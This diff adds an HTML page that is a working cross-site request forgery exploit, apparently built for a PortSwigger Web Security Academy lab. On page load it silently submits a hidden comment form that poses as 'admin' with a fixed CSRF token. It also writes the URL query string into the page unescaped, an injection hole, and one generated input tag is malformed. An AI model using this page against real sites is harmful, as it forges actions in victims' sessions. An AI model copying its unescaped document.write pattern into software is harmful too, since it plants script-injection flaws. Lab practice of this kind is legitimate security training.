@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>CSRF</title>
+</head>
+<body onload="document.createElement('form').submit.call(document.getElementById('myForm'))">
+        <form id="myForm" name="myForm" action="https://aca21f191ec9d0a88022753500c90019.web-security-academy.net/post/comment" method="POST">
+            <input type=hidden name="csrf" id="val1" value="utCjb9yo5laRAFWmwTES5jFsbr1C1VxL"/>
+            <input type=hidden name="postId" id="val2" value="3"/>
+            <input type=hidden name="name" id="val3" value="admin"/>
+            <input type=hidden name="email" id="val4" value="admin@portswigger.net"/>
+            <input type=hidden name="website" id="val5" value="https://google.com"/>
+            <script>
+            	var x = location.search;
+                document.write('<input type=hidden name="comment" id="val6" value="' + x.split('=')[1]  + ' />')
+            </script>  
+            <input type=hidden name="submit" id="submit" value="Continue"/>
+        </form>
+
+        <script type="text/javascript">
+        	var x = location.search;
+
+			document.write(x.split('=')[1]);
+        </script>
+
+
+</body>
+</html>
